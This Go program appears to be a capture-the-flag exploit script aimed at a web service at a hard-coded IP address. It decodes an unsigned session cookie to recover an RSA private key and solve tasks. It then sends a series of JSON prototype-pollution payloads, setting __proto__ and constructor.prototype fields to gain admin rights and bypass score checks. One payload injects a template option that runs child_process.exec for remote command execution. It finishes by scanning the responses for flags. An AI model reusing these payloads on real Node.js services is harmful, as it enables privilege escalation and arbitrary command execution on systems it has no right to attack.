package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"
)

const baseURL = "http://95.111.234.103:2900"

var numRe = regexp.MustCompile(`-?\d+`)

type Task struct {
	N string `json:"n"`
	E int    `json:"e"`
	C string `json:"c"`
}

type SessionData struct {
	Key            string `json:"key"`
	Task           Task   `json:"task"`
	CorrectAnswers int    `json:"correctAnswers"`
}

func newClient() *http.Client {
	jar, _ := cookiejar.New(nil)
	return &http.Client{Timeout: 10 * time.Second, Jar: jar}
}

func decodeCookie(val string) ([]byte, error) {
	padded := val
	if m := len(padded) % 4; m != 0 {
		padded += strings.Repeat("=", 4-m)
	}
	if b, err := base64.StdEncoding.DecodeString(padded); err == nil {
		return b, nil
	}
	if b, err := base64.URLEncoding.DecodeString(padded); err == nil {
		return b, nil
	}
	return nil, fmt.Errorf("invalid base64 cookie")
}

func getSessionData(c *http.Client) (*SessionData, map[string]any, error) {
	u, _ := url.Parse(baseURL)
	cookies := c.Jar.Cookies(u)
	var val string
	for _, ck := range cookies {
		if ck.Name == "session" {
			val = ck.Value
			break
		}
	}
	if val == "" {
		return nil, nil, fmt.Errorf("session cookie not found")
	}
	raw, err := decodeCookie(val)
	if err != nil {
		return nil, nil, err
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		return nil, nil, err
	}
	var sd SessionData
	if err := json.Unmarshal(raw, &sd); err != nil {
		return nil, nil, err
	}
	return &sd, m, nil
}

func parsePrivateKey(pemStr string) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(pemStr))
	if block == nil {
		return nil, fmt.Errorf("invalid pem")
	}
	if k, err := x509.ParsePKCS8PrivateKey(block.Bytes); err == nil {
		return k.(*rsa.PrivateKey), nil
	}
	if k, err := x509.ParsePKCS1PrivateKey(block.Bytes); err == nil {
		return k, nil
	}
	return nil, fmt.Errorf("unsupported key format")
}

func decodeCipher(b64 string) ([]byte, error) {
	if b, err := base64.StdEncoding.DecodeString(b64); err == nil {
		return b, nil
	}
	if b, err := base64.URLEncoding.DecodeString(b64); err == nil {
		return b, nil
	}
	return nil, fmt.Errorf("invalid cipher base64")
}

func decryptTask(task Task, pemKey string) (string, error) {
	key, err := parsePrivateKey(pemKey)
	if err != nil {
		return "", err
	}
	cBytes, err := decodeCipher(task.C)
	if err != nil {
		return "", err
	}
	out := make([]byte, 0)
	for i := 0; i < len(cBytes); i += key.Size() {
		h := sha1.New()
		part, err := rsa.DecryptOAEP(h, rand.Reader, key, cBytes[i:i+key.Size()], nil)
		if err != nil {
			return "", err
		}
		out = append(out, part...)
	}
	return string(out), nil
}

func generateTask(c *http.Client) (map[string]any, error) {
	resp, err := c.Get(baseURL + "/generate-task")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var m map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&m); err != nil {
		return nil, err
	}
	return m, nil
}

func solveOne(c *http.Client) (map[string]any, error) {
	sd, _, err := getSessionData(c)
	if err != nil {
		return nil, err
	}
	pt, err := decryptTask(sd.Task, sd.Key)
	if err != nil {
		return nil, err
	}
	ans := numRe.FindString(pt)
	payload := map[string]string{"input": ans}
	b, _ := json.Marshal(payload)
	resp, err := c.Post(baseURL+"/check-task", "application/json", bytes.NewReader(b))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var m map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&m); err != nil {
		return nil, err
	}
	return m, nil
}

func solveWithPollution(c *http.Client, pollutionJSON string) (map[string]any, error) {
	sd, _, err := getSessionData(c)
	if err != nil {
		return nil, err
	}
	pt, err := decryptTask(sd.Task, sd.Key)
	if err != nil {
		return nil, err
	}
	ans := numRe.FindString(pt)

	var payload map[string]any
	if err := json.Unmarshal([]byte(pollutionJSON), &payload); err != nil {
		return nil, err
	}
	payload["input"] = ans
	b, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", baseURL+"/check-task", bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var m map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&m); err != nil {
		return nil, err
	}
	return m, nil
}

func printExtras(prefix string, m map[string]any) {
	extras := make(map[string]any)
	for k, v := range m {
		if k == "key" || k == "task" {
			continue
		}
		extras[k] = v
	}
	if len(extras) > 0 {
		fmt.Printf("%s%v\n", prefix, extras)
	}
}

func printPossibleFlags(m map[string]any) {
	for k, v := range m {
		if k == "task" {
			continue
		}
		vs := strings.ToLower(fmt.Sprint(v))
		if strings.Contains(vs, "flag") || strings.Contains(vs, "novruz") || strings.Contains(fmt.Sprint(v), "{") {
			fmt.Printf("  *** POSSIBLE FLAG: %s=%v ***\n", k, v)
		}
	}
}

func filterResult(m map[string]any) map[string]any {
	out := make(map[string]any)
	for k, v := range m {
		if k != "task" {
			out[k] = v
		}
	}
	return out
}

func checkMainPage(c *http.Client) {
	resp, err := c.Get(baseURL + "/")
	if err != nil {
		return
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	text := strings.ToLower(string(b))
	if strings.Contains(text, "flag") || strings.Contains(text, "novruz") {
		fmt.Println("  *** FLAG IN HTML ***")
		fmt.Println(string(b))
	}
}

func main() {
	pollutionPayloads := []string{
		`{"__proto__": {"isAdmin": true, "correctAnswers": 99999, "flag": true, "win": true}}`,
		`{"constructor": {"prototype": {"isAdmin": true, "correctAnswers": 99999}}}`,
		`{"__proto__": {"__proto__": {"isAdmin": true}}}`,
		`{"__proto__": {"threshold": 0, "minScore": 0, "requiredAnswers": 0}}`,
		`{"constructor": {"prototype": {"threshold": 0, "minScore": 0, "requiredAnswers": 0}}}`,
		`{"__proto__": {"outputFunctionName": "x]};process.mainModule.require('child_process').exec('id')//", "correctAnswers": 99999}}`,
	}

	for i, pp := range pollutionPayloads {
		fmt.Printf("\n=== Pollution payload %d ===\n", i)
		fmt.Printf("  %s...\n", pp)

		sa := newClient()
		_, _ = generateTask(sa)
		res, err := solveWithPollution(sa, pp)
		if err != nil {
			fmt.Println("  pollution error:", err)
			continue
		}
		fmt.Printf("  Pollution response: success=%v, answered=%v\n", res["success"], res["answered"])
		printPossibleFlags(res)

		sb := newClient()
		gen, _ := generateTask(sb)
		_, smap, _ := getSessionData(sb)
		printExtras("  New session extras: ", smap)

		resB, err := solveOne(sb)
		if err == nil {
			fmt.Printf("  New session result: %v\n", filterResult(resB))
		}
		_, smap2, _ := getSessionData(sb)
		printExtras("  New session after solve: ", smap2)

		if gen != nil {
			printExtras("  generate-task extras: ", gen)
		}
		gen2, _ := generateTask(sb)
		if gen2 != nil {
			printExtras("  generate-task extras: ", gen2)
		}
		checkMainPage(sb)
	}
}
